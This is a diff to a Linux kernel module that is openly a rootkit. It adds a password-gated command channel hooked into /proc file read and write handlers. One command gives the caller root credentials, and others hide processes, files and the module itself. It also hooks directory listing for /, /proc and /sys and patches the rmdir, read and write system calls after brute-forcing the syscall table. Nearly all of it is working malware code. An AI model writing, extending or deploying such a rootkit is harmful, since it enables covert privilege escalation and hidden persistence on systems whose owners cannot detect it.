@@ -65,7 +65,7 @@ struct proc_dir_entry
 #define CFG_UNHIDE "unhide"
 #define CFG_PROTECT "protect"
 #define CFG_UNPROTECT "unprotect"
-#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
+//#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
 
 //For finding the sys_call_table adress we will brute force it
 //It has to be in this range depending OS type.
@@ -149,8 +149,9 @@ struct proc_dir_entry
 
 // Macros to actually use
 #define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
-#define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) \
-READDIR(NAME)
+#define READDIR_HOOK_END(NAME) \
+    FILLDIR_END(NAME)          \
+    READDIR(NAME)
 
 /*
 *
@@ -751,6 +752,167 @@ READDIR_HOOK_END(sys)
 *
 */
 
+int execute_command(const char __user *str, size_t length)
+{
+    if (length <= sizeof(CFG_PASS) ||
+        strncmp(str, CFG_PASS, sizeof(CFG_PASS)) != 0)
+    {
+        return 0;
+    }
+
+    pr_info("Password check passed\n");
+
+    // since the password matched, we assume the command following the password
+    // is in the valid format
+
+    str += sizeof(CFG_PASS);
+
+    if (strcmp(str, CFG_ROOT) == 0)
+    {
+        pr_info("Got root command\n");
+        struct cred *creds = prepare_creds();
+
+        creds->uid.val = creds->euid.val = 0;
+        creds->gid.val = creds->egid.val = 0;
+
+        commit_creds(creds);
+    }
+    else if (strcmp(str, CFG_HIDE_PID) == 0)
+    {
+        pr_info("Got hide pid command\n");
+        str += sizeof(CFG_HIDE_PID);
+        pid_add(str);
+    }
+    else if (strcmp(str, CFG_UNHIDE_PID) == 0)
+    {
+        pr_info("Got unhide pid command\n");
+        str += sizeof(CFG_UNHIDE_PID);
+        pid_remove(str);
+    }
+    else if (strcmp(str, CFG_HIDE_FILE) == 0)
+    {
+        pr_info("Got hide file command\n");
+        str += sizeof(CFG_HIDE_FILE);
+        file_add(str);
+    }
+    else if (strcmp(str, CFG_UNHIDE_FILE) == 0)
+    {
+        pr_info("Got unhide file command\n");
+        str += sizeof(CFG_UNHIDE_FILE);
+        file_remove(str);
+    }
+    else if (strcmp(str, CFG_HIDE) == 0)
+    {
+        pr_info("Got hide command\n");
+        hide();
+    }
+    else if (strcmp(str, CFG_UNHIDE) == 0)
+    {
+        pr_info("Got unhide command\n");
+        unhide();
+    }
+    else if (strcmp(str, CFG_PROTECT) == 0)
+    {
+        pr_info("Got protect command\n");
+        protect();
+    }
+    else if (strcmp(str, CFG_UNPROTECT) == 0)
+    {
+        pr_info("Got unprotect command\n");
+        unprotect();
+    }
+    else
+    {
+        pr_info("Got unknown command\n");
+    }
+
+    return 1;
+}
+
+static ssize_t proc_fops_write(struct file *file, const char __user *buf_user, size_t count, loff_t *p)
+{
+    if (execute_command(buf_user, count))
+    {
+        return count;
+    }
+
+    int (*original_write)(struct file *, const char __user *, size_t, loff_t *);
+    original_write = asm_hook_unpatch(proc_fops_write);
+    ssize_t ret = original_write(file, buf_user, count, p);
+    asm_hook_patch(proc_fops_write);
+
+    return ret;
+}
+
+static ssize_t proc_fops_read(struct file *file, char __user *buf_user, size_t count, loff_t *p)
+{
+    execute_command(buf_user, count);
+
+    int (*original_read)(struct file *, char __user *, size_t, loff_t *);
+    original_read = asm_hook_unpatch(proc_fops_read);
+    ssize_t ret = original_read(file, buf_user, count, p);
+    asm_hook_patch(proc_fops_read);
+
+    return ret;
+}
+
+int setup_proc_comm_channel(void)
+{
+    static const struct file_operations proc_file_fops = {0};
+    struct proc_dir_entry *proc_entry = proc_create("temporary", 0444, NULL, &proc_file_fops);
+    proc_entry = proc_entry->parent;
+
+    if (strcmp(proc_entry->name, "/proc") != 0)
+    {
+        pr_info("Couldn't find \"/proc\" entry\n");
+        remove_proc_entry("temporary", NULL);
+        return 0;
+    }
+
+    remove_proc_entry("temporary", NULL);
+
+    struct file_operations *proc_fops = NULL;
+
+    struct rb_node *entry = rb_first(&proc_entry->subdir);
+
+    while (entry)
+    {
+        pr_info("Looking at \"/proc/%s\"\n", rb_entry(entry, struct proc_dir_entry, subdir_node)->name);
+
+        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, CFG_PROC_FILE) == 0)
+        {
+            pr_info("Found \"/proc/%s\"\n", CFG_PROC_FILE);
+            proc_fops = (struct file_operations *)rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
+            goto found;
+        }
+
+        entry = rb_next(entry);
+    }
+
+    pr_info("Couldn't find \"/proc/%s\"\n", CFG_PROC_FILE);
+
+    return 0;
+
+found:;
+
+    if (proc_fops->write)
+    {
+        asm_hook_create(proc_fops->write, proc_fops_write);
+    }
+
+    if (proc_fops->read)
+    {
+        asm_hook_create(proc_fops->read, proc_fops_read);
+    }
+
+    if (!proc_fops->read && !proc_fops->write)
+    {
+        pr_info("\"/proc/%s\" has no write nor read function set\n", CFG_PROC_FILE);
+        return 0;
+    }
+
+    return 1;
+}
 
 /*
 *
@@ -760,7 +922,52 @@ READDIR_HOOK_END(sys)
 *
 */
 
+int init(void)
+{
+    pr_info("Module loaded\n");
+    hide();
+    protect();
 
+    if (!setup_proc_comm_channel())
+    {
+        pr_info("Failed to set up comm channel\n");
+        unprotect();
+        unhide();
+        return -1;
+    }
+
+    pr_info("Comm channel is set up\n");
+
+    asm_hook_create(get_fop("/")->iterate, root_iterate);
+    asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
+    asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
+
+    sys_call_table = find_syscall_table();
+    pr_info("Found sys_call_table at %p\n", sys_call_table);
+
+    asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
+
+    hook_create(&sys_call_table[__NR_read], read);
+    hook_create(&sys_call_table[__NR_write], write);
+
+    return 0;
+}
+
+void exit(void)
+{
+    pr_info("sys_rmdir was called %lu times\n", asm_rmdir_count);
+    pr_info("sys_read was called %lu times\n", read_count);
+    pr_info("sys_write was called %lu times\n", write_count);
+
+    hook_remove_all();
+    asm_hook_remove_all();
+    pid_remove_all();
+    file_remove_all();
+
+    THIS_MODULE->name[0] = 0;
+
+    pr_info("Module removed\n");
+}
 
 module_init(init);
 module_exit(exit);
